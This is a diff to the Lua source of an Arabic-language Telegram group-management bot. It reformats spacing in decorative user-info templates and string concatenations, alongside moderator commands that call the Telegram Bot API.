-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14832,11 +14839,11 @@ Msᴀɢ ~ #msgs
 ➜𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14876,11 +14883,11 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14892,42 +14899,42 @@ Msᴀɢ ~ #msgs
 .𖣂 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14939,12 +14946,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -15217,14 +15224,14 @@ end
 if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
 end   
-if database:get(bot_id.."numadd:user"..msg.chat_id_..""..msg.sender_user_id_) then 
+if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 database:del(bot_id..'id:user'..msg.chat_id_)  
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء الامر ") 
-database:del(bot_id.."numadd:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  
 end 
-database:del(bot_id.."numadd:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
 local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
 database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
@@ -15232,14 +15239,14 @@ database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)
 send(msg.chat_id_, msg.id_," ☉┇ تم اضافة له {"..numadded..'} من الرسائل')  
 end
 ------------------------------------------------------------------------
-if database:get(bot_id.."gemadd:user"..msg.chat_id_..""..msg.sender_user_id_) then 
+if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 database:del(bot_id..'idgem:user'..msg.chat_id_)  
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء الامر ") 
-database:del(bot_id.."gemadd:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  
 end 
-database:del(bot_id.."gemadd:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
 local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
 database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
@@ -15249,7 +15256,7 @@ end
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
 sofi = text:match("^اضف رسائل (%d+)$")
 database:set(bot_id..'id:user'..msg.chat_id_,sofi)  
-database:setex(bot_id.."numadd:user"..msg.chat_id_..""..msg.sender_user_id_, 120, true)  
+database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ ارسل لي عدد الرسائل الان') 
 return false
 end
@@ -15257,7 +15264,7 @@ end
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
 sofi = text:match("^اضف نقاط (%d+)$")
 database:set(bot_id..'idgem:user'..msg.chat_id_,sofi)  
-database:setex(bot_id.."gemadd:user"..msg.chat_id_..""..msg.sender_user_id_, 120, true)  
+database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ ارسل لي عدد النقاط التي تريد اضافتها') 
 return false
 end
@@ -15331,7 +15338,7 @@ end
 return false 
 end
 if text == 'فحص البوتت' and Manager(msg) then
-local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id..'')
+local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
 local Json_Info = JSON.decode(Chek_Info)
 if Json_Info.ok == true then
 if Json_Info.result.status == "administrator" then
@@ -15430,7 +15437,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 ----------------------------------------------------------------------------
@@ -15472,7 +15479,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
@@ -15607,7 +15614,7 @@ keyboard.inline_keyboard = {
 {{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text and text:match('^كشف (%d+)$') then
 local id = text:match('^كشف (%d+)$')
@@ -15890,7 +15897,7 @@ local Teext =[[
 ☉┇ تغير امر م1 ~ الئ م10
 •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
-☉┇ اوامر المجموعه 📢.
+☉┇ اوامر المجموعه 📢 .
 •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•
 ☉┇ استعاده الاوامر 
 ☉┇ تحويل كالاتي~⪼ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
@@ -16635,7 +16642,7 @@ local users = ('[@'..data.username_..']' or iduser)
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
 t = "\n ☉┇ شخص ما يحاول تعديل الميديا \n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
